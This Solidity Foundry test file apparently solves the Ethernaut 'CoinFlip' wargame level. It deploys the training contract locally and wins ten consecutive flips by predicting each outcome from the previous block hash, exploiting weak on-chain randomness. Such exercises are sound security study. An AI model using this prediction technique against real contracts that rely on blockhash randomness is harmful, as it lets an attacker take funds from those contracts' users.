// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/Ethernaut/CoinFlip.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract CoinFlipExploit is Test {
  CoinFlip target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new CoinFlip();
    console2.log('Target contract deployed');
    vm.stopPrank();
  }

  function testExploit() public {
    uint wins = target.consecutiveWins();
    console2.log('Consecutive wins: %d', wins);
    assertEq(wins, 0);

    // Guess the outcome of the coin a few times.
    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;

    while (wins < 10) {
      uint256 blockValue = uint256(blockhash(block.number - 1));
      if (lastHash == blockValue) {
        vm.roll(block.number + 1);
        continue;
      }

      lastHash = blockValue;
      uint256 coinFlip = blockValue / factor;
      bool guess = coinFlip == 1 ? true : false;
      assertTrue(target.flip(guess));
      console2.log('Good guess!');
      wins = target.consecutiveWins();
    }

    wins = target.consecutiveWins();
    console2.log('Consecutive wins: %d', wins);
    assertEq(wins, 10);
  }
}
